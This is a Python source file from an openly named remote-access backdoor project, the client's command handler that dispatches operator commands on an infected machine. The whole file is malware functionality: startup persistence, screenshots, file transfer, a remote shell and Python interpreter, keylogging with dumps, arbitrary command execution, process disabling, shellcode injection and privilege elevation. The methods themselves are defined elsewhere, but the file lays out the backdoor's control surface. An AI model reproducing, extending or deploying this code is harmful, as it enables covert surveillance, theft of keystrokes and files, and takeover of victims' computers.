"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import src.definitions.commands as c


class CommandHandler:

    def __init__(self, control):
        self.control = control

    def parse(self, command):

        _command = command["key"]

        if _command == c.CLIENT_EXIT:
            self.control.close()
        elif _command == c.CLIENT_ADD_STARTUP:
            self.control.add_startup()
        elif _command == c.CLIENT_RMV_STARTUP:
            self.control.add_startup(True)
        elif _command == c.CLIENT_SCREENSHOT:
            self.control.screenshot()
        elif _command == c.CLIENT_UPLOAD_FILE:
            self.control.upload(command["value"]["buffer"], command["value"]["value"])
        elif _command == c.CLIENT_RECV_FILE:
            self.control.receive(command["value"])
        elif _command == c.CLIENT_LOCK:
            self.control.lock()
        elif _command == c.CLIENT_HEARTBEAT:
            self.control.heartbeat()
        elif _command == c.CLIENT_SHELL:
            self.control.command_shell()
        elif _command == c.CLIENT_PYTHON_INTERPRETER:
            self.control.python_interpreter()
        elif _command == c.CLIENT_KEYLOG_START:
            self.control.keylogger_start()
        elif _command == c.CLIENT_KEYLOG_STOP:
            self.control.keylogger_stop()
        elif _command == c.CLIENT_KEYLOG_DUMP:
            self.control.keylogger_dump()
        elif _command == c.CLIENT_RUN_CMD:
            self.control.run_command(command["value"])
        elif _command == c.CLIENT_DISABLE_PROCESS:
            self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
        elif _command == c.CLIENT_SHELLCODE:
            self.control.inject_shellcode(command["value"]["buffer"])
        elif _command == c.CLIENT_ELEVATE:
            self.control.elevate()

